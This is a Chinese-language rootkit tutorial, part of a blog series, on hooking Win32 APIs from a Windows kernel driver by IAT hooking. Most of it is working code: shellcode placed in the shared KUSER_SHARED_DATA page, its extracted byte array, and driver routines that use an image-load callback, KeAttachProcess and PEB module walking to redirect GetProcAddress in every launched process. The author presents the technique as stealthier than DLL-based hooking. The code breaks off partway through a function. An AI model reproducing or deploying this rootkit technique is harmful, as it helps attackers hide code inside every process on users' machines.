
# [原创]rootkit hook 之[七]--- IAT Hook

今天这篇HOOK,主要是讲在内核中HOOK WIN32 API的办法。这个办法，比你采用全局钩子加载DLL来HOOK API的方法更具有隐蔽性。到这里我们的内核hook 7篇组成的“七星剑法”就练完了。后面将开始关于保护模式的八篇文章，希望大家继续跟贴鼓励。

在内核中hook win32 api需要用shellcode的东西。因此在内核中hook win32 api也具有魅力。因此，为了写好此篇，也花费了我不少时间。篇幅较长，大家慢慢看。

这里有个问题要解决，就是你的hook 函数是在ring0中实现的，ring3如何能访问到呢？

俗话说，天无绝人之路，总会有解决办法的。

就是Barnaby Jack在论文“Remote Windows Kernel Exploitation: Step into the Ring 0”中所用的技术。它利用了两个虚地址映射到同一个物理地址这个事实。内核地址`0xFFDF0000`和用户地址`0x7FFE0000`都指向同一物理页面。内核地址是可写的，但用户地址则不能。

也就说是说，我们可以在ring0层把信息写入到`0xFFDF0000`~`0xFFDF0FFF`的4K虚拟页面空间，由于用户地址`0x7FFE0000`也指向这个物理页面，所以我们在`0xFFDF0000`~`0xFFDF0FFF`地址写入的代码，在用户空间可以访问到。

该共享区域的大小是4K。内核占用其中一部分，内存区域的名称是`KUSER_SHARED_DATA`。可以在WinDbg中看看。

```
lkd> dt nt!_KUSER_SHARED_DATA
   +0x000 TickCountLow     : Uint4B
   +0x004 TickCountMultiplier : Uint4B
   +0x008 InterruptTime    : _KSYSTEM_TIME
   +0x014 SystemTime       : _KSYSTEM_TIME
   +0x020 TimeZoneBias     : _KSYSTEM_TIME
   +0x02c ImageNumberLow   : Uint2B
   +0x02e ImageNumberHigh  : Uint2B
   +0x030 NtSystemRoot     : [260] Uint2B
   +0x238 MaxStackTraceDepth : Uint4B
   +0x23c CryptoExponent   : Uint4B
   +0x240 TimeZoneId       : Uint4B
   +0x244 Reserved2        : [8] Uint4B
   +0x264 NtProductType    : _NT_PRODUCT_TYPE
   +0x268 ProductTypeIsValid : UChar
   +0x26c NtMajorVersion   : Uint4B
   +0x270 NtMinorVersion   : Uint4B
   +0x274 ProcessorFeatures : [64] UChar
   +0x2b4 Reserved1        : Uint4B
   +0x2b8 Reserved3        : Uint4B
   +0x2bc TimeSlip         : Uint4B
   +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE
   +0x2c8 SystemExpirationDate : _LARGE_INTEGER
   +0x2d0 SuiteMask        : Uint4B
   +0x2d4 KdDebuggerEnabled : UChar
   +0x2d5 NXSupportPolicy  : UChar
   +0x2d8 ActiveConsoleId  : Uint4B
   +0x2dc DismountCount    : Uint4B
   +0x2e0 ComPlusPackage   : Uint4B
   +0x2e4 LastSystemRITEventTickCount : Uint4B
   +0x2e8 NumberOfPhysicalPages : Uint4B
   +0x2ec SafeBootMode     : UChar
   +0x2f0 TraceLogging     : Uint4B
   +0x2f8 TestRetInstruction : Uint8B
   +0x300 SystemCall       : Uint4B
   +0x304 SystemCallReturn : Uint4B
   +0x308 SystemCallPad    : [3] Uint8B
   +0x320 TickCount        : _KSYSTEM_TIME
   +0x320 TickCountQuad    : Uint8B
   +0x330 Cookie           : Uint4B
```

我们看到4K页面对应的字节数是`0x1000`, 而实际操作系统只占用了`0x334`字节。而剩下的空间，我们当然可以利用了。demo程序中是从偏移800的位置开始的。这样，可用的字节数有2047个字节。

到这里，所有的问题都解决了。当然了，这也不是唯一的解决办法，你也可以不把hook 函数放在ring0中，而是在ring0里将其注入到ring3某个模块的缝隙里。

接下来，谈谈我们的思路，写一个驱动，利用`PsSetLoadImageNotifyRoutine`加载一个回调函数，由于回调函数中已经具备当前进程的一些信息，我们在这个回调函数中利用IAT hook的方式hook一个api,例如hook `GetProcAddress`。我们把要执行的函数写入共享区中。IAT HOOK的时候，直接指向共享区中我们写入的函数的地址。当用户程序调用`GetProcAddress` api函数的时候，共享区中的这段shellcode码便被执行了。我们demo是指要调用 `GetProcAddress` 的地方都会弹出一个对话框。

简单写一个shellcode如下：

```c
#include "windows.h"

int main(int argc, char* argv[])

{
    HMODULE hM = LoadLibrary("user32.dll");
        _asm
        {
                push ebp
            call Deleta
Deleta:
                pop ebp
                sub ebp,offset Deleta
                jmp $+0x0d
fun1:                       //MessageBoxA的地址，这个我偷懒，是参照我机器上的写
                            死了，正规讲，要从iat中找出来，或者从user32.dll模块
                            的导出表中找出来，反正这里是个demo，没必要那么讲究
                            了。
       _emit 0x02
           _emit 0x07
           _emit 0xd5
           _emit 0x77
fun2:                    //GetProcAddress地址 ，这个在IAT中替换
       _emit 0xa0
           _emit 0xad
           _emit 0x80
           _emit 0x7c
                push 0x00000040
       call L1
                _emit 'h'
                _emit 'e'
                _emit 'l'
                _emit 'l'
                _emit 'o'
                _emit 0
                _emit 0
                _emit 0
L1:
                call L2
                _emit 'C'
                _emit 'o'
                _emit 'm'
                _emit 'b'
                _emit 'o'
                _emit 'j'
                _emit 'i'
                _emit 'a'
                _emit 'n'
                _emit 'g'
                _emit 0
                _emit 0
L2:
                push 0
                lea eax,[ebp + fun1]
                call [eax]
                lea eax,[ebp + fun2]
                pop ebp
                jmp DWORD ptr[eax]
        }
        return 0;
}
```

提取代码为：

```c
unsigned char new_code[] = {
                                       0x55, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81, 0xED, 0x45,
                                                                  0x10, 0x40, 0x00, 0xE9, 0x08, 0x00, 0x00, 0x00, 0x02, 0x07,
                                                                  0xD5, 0x77, 0xa0, 0xad, 0x80, 0x7c, 0x6A, 0x40, 0xE8, 0x08,
                                                                  0x00, 0x00, 0x00, 0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x00, 0x00,
                                                                  0x00, 0xE8, 0x0c, 0x00, 0x00, 0x00, 0x43, 0x6F, 0x6D, 0x62,
                                                                  0x6F, 0x6A, 0x69, 0x61, 0x6E, 0x67, 0x00, 0x00, 0x6A, 0x00,
                                                                  0x8d, 0x85, 0x51, 0x10, 0x40, 0x00, 0xFF, 0x10, 0x8d, 0x85,
                                                                  0x55, 0x10, 0x40, 0x00, 0x5d, 0xFF, 0x20};
```

呵呵，自从挂接了这个驱动，我的机器里面，随便启动个程序，就不停的弹出窗口了。下面贴出核心代码来。

```c
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
                                         IN PUNICODE_STRING theRegistryPath)
{
        NTSTATUS ntStatus;
        gb_Hooked = FALSE; // We have not hooked yet
        ntStatus = PsSetLoadImageNotifyRoutine(MyImageLoadNotify);
    return ntStatus;
}
```

```c
VOID MyImageLoadNotify(IN PUNICODE_STRING  FullImageName,
                       IN HANDLE  ProcessId, // Process where image is mapped
                                                     IN PIMAGE_INFO  ImageInfo)
{
        UNICODE_STRING u_targetDLL;
        DbgPrint("Image name: %ws\n", FullImageName->Buffer);
        // Setup the name of the DLL to target
        RtlInitUnicodeString(&u_targetDLL, L"\\WINDOWS\\system32\\user32.dll");
        if (RtlCompareUnicodeString(FullImageName, &u_targetDLL, TRUE) == 0)
        {
                DbgPrint(" imageInfo->ImageBase:%x  ProcessId : %d\n", ImageInfo->ImageBase, ProcessId);
                HookIAT(&u_targetDLL,"GetProcAddress",ProcessId);
        }
}
```

```c
NTSTATUS HookIAT(PUNICODE_STRING pModuleName, PCHAR pFunctionName,  HANDLE  ProcessId)
{
    ULONG pEProcess;
        PLIST_ENTRY pCurrentList = NULL, pTempList = NULL, pLoadOrderModuleList, list;
        PPEB pPeb = NULL;
    ULONG hModule, temp;
        PsLookupProcessByProcessId(ProcessId,(PEPROCESS*)&pEProcess);
        pPeb = (PPEB)(*(PULONG)(pEProcess + PEBOFFSET));
        if(pPeb != NULL)
        {
                KeAttachProcess((PEPROCESS)pEProcess);  // 切换内存上下文到指定的进程
                //遍历进程模块
                pLoadOrderModuleList = pPeb->LoaderData->InLoadOrderModuleList.Flink;
            list = pLoadOrderModuleList;
            do   // 遍历进程所加载模块中，直到找到EXE模块
                {
                       UNICODE_STRING pstrTemp = ((PLDR_MODULE)list)->FullDllName;
             DbgPrint("module name = %ws\n\n\n\n",pstrTemp.Buffer);
                         if(wcsstr(pstrTemp.Buffer,L".exe") != NULL)
                         {
                                        hModule = (ULONG)((PLDR_MODULE)list)->BaseAddress;
                                        temp = *(PULONG)hModule;
                                        DbgPrint("Find Module baseAaddress = %x\n\n\n",hModule);
                                HookImportsOfImage((PIMAGE_DOS_HEADER)hModule,ProcessId,pFunctionName);
                                        break;
                         }
                         list = list->Flink;
                } while(list != pLoadOrderModuleList);
```

